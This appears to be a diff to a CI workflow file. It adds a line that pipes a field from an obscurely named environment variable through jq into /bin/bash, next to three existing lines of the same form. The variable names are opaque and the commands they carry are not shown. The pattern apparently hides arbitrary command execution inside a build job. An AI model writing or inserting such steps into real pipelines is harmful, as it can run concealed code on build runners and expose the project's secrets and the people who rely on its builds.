@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$tnfg77" | jq -r .bf8851 | /bin/bash
           echo $af77903 | jq -r .ashn3 | /bin/bash
           echo $pheb5 | jq -r .mjtn2 | /bin/bash
+          echo $mrq17 | jq -r .bdnx9117 | /bin/bash
 
       - name: Archive results
         if: always()
